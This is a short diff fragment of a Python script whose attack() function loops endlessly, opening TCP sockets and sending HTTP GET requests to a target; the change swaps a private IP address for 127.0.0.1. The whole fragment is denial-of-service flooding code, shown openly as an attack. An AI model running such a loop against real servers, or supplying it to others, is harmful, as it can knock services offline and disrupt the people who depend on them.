@@ -16,8 +16,8 @@ attack_cont = 0
 def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("172.21.209.231", 80))
-        s.sendto(b"GET / HTTP/1.1\r\nHost: 172.21.209.231\r\n")
+        s.connect(("127.0.0.1", 80))
+        s.sendto(b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n")
         resp = s.recv(4096)
 
         global attack_cont
